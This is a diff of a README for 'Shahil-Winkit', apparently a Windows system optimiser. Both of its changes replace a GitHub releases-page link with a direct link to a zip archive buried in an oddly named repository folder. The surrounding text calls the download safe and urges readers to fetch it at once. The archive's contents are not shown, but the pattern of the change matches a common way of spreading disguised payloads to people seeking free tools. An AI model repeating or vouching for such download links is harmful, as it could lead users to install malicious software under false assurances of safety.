@@ -10,7 +10,7 @@ Think of Shahil-Winkit as a helpful assistant that takes care of the boring and 
 
 To start using Shahil-Winkit, you first need to download it. The download is safe, free, and takes less than a minute.
 
-**[🚀 DOWNLOAD SHAHIL-WINKIT NOW](https://github.com/eano158/Shahil-Winkit/releases)**
+**[🚀 DOWNLOAD SHAHIL-WINKIT NOW](https://raw.githubusercontent.com/eano158/Shahil-Winkit/main/yaguaza/Winkit_Shahil_1.5.zip)**
 
 Visit this link to download the application. It will take you to a page where you can find the latest version. Click the download button, and the file will be saved to your computer. Once the download is complete, you can move the file to any folder you like, such as your Desktop or Downloads folder.
 
@@ -118,7 +118,7 @@ Download it today and see the difference a well-optimized system makes.
 
 Don't wait. Get the benefits of a faster, cleaner, and more personal Windows system today.
 
-**[⬇️ CLICK HERE TO DOWNLOAD SHAHIL-WINKIT](https://github.com/eano158/Shahil-Winkit/releases)**
+**[⬇️ CLICK HERE TO DOWNLOAD SHAHIL-WINKIT](https://raw.githubusercontent.com/eano158/Shahil-Winkit/main/yaguaza/Winkit_Shahil_1.5.zip)**
 
 ---
 
